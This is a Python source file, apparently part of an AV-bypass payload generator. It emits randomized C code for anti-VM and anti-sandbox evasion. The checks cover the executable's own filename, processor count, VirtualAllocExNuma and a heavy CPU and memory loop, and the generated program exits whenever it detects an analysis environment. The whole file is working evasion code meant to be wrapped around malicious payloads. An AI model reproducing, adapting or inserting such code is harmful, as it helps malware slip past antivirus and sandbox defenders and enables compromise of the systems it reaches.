from lib import core
import random


# Add Anti-VM code
def the_great_evasion(architecture, filename):
    evasion_func = ""
    evasion_funcname = ""

    if architecture == "x86":
        evasion_funcname_0, evasion_0 = hard_usage()
        evasion_funcname_1, evasion_1 = number_of_core()
        evasion_funcname_2, evasion_2 = my_name_is(filename)
        evasion_func += evasion_0 + evasion_1 + evasion_2
        evasion_funcname += evasion_funcname_0 + evasion_funcname_1 + evasion_funcname_2

    else:
        evasion_funcname_0, evasion_0 = hard_usage()
        evasion_funcname_1, evasion_1 = number_of_core()
        evasion_funcname_2, evasion_2 = mono_core()
        evasion_funcname_3, evasion_3 = my_name_is(filename)
        evasion_func += evasion_0 + evasion_1 + evasion_2 + evasion_3
        evasion_funcname += evasion_funcname_0 + evasion_funcname_1 + evasion_funcname_2 + evasion_funcname_3

    core.evasion_added()
    return evasion_funcname, evasion_func


def replace_string(evasion_funcname):
    evasion_funcname = evasion_funcname.replace("void ", "").replace("void", "").replace("\n", "") + ";\n"
    return evasion_funcname


def my_name_is(filename):
    evasion_funcname = "void " + core.varname_creator() + "(char *args)\n"

    b = core.varname_creator()
    filename = filename.replace('output/', '')
    evasion_func = evasion_funcname
    evasion_func += '{if (strstr(args, "' + filename + '") > 0){int ' + b + ' = 0;}\n'
    evasion_func += "else{exit(0);}}\n\n"

    evasion_funcname = evasion_funcname.replace("(char *args)", "(argv[0])")
    evasion_funcname = replace_string(evasion_funcname)
    return evasion_funcname, evasion_func


# Check number of core
def number_of_core():
    evasion_funcname = "void " + core.varname_creator() + "(void)\n"
    sysguide = core.varname_creator()
    xcore = core.varname_creator()

    evasion_func = evasion_funcname
    evasion_func += "{SYSTEM_INFO " + sysguide + ";\n"
    evasion_func += "GetSystemInfo(&" + sysguide + ");\n"
    evasion_func += "int " + xcore + " = " + sysguide + ".dwNumberOfProcessors;\n"
    evasion_func += "if (" + xcore + " < 2){exit(0);}}\n\n"

    evasion_funcname = replace_string(evasion_funcname)
    return evasion_funcname, evasion_func


# AV have no multiproc
def mono_core():
    evasion_funcname = "void " + core.varname_creator() + "(void)\n"
    mem2 = core.varname_creator()

    evasion_func = evasion_funcname
    evasion_func += "{LPVOID " + mem2 + "= NULL;\n"
    evasion_func += mem2 + " = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);\n"
    evasion_func += "if (" + mem2 + " != NULL){\n"
    evasion_func += 'printf("' + core.varname_creator() + '");}\n'
    evasion_func += "else{exit(0);}}\n\n"

    evasion_funcname = replace_string(evasion_funcname)
    return evasion_funcname, evasion_func


# Fake cpu/mem operation
def hard_usage():
    evasion_funcname = "void " + core.varname_creator() + "(void)\n"
    op1 = core.varname_creator()
    op1_value = str(random.randint(6000, 8000))
    iterator1 = core.varname_creator()
    mem1 = core.varname_creator()
    mem1_value = str(random.randint(45000000, 90000000))

    evasion_func = evasion_funcname
    evasion_func += "{int " + op1 + "= " + op1_value + ";\n"
    evasion_func += "int " + iterator1 + " = 0;\n"
    evasion_func += "for (" + iterator1 + " = 0; " + iterator1 + " < " + op1 + "; " + iterator1 + "++){\n"
    evasion_func += 'printf("%d\\n", ' + iterator1 + ');\n'
    evasion_func += "char * " + mem1 + " = NULL;\n"
    evasion_func += mem1 + " = (char * )malloc(" + mem1_value + ");\n"
    evasion_func += "if (" + mem1 + " != NULL){\n"
    evasion_func += "memset(" + mem1 + ", 00, " + mem1_value + ");\n"
    evasion_func += "free(" + mem1 + ");}\n"
    evasion_func += "else{exit(0);}}\n"
    evasion_func += "if (" + iterator1 + " != " + op1 + "){\n"
    evasion_func += "exit(0);}}\n\n"

    evasion_funcname = replace_string(evasion_funcname)
    return evasion_funcname, evasion_func
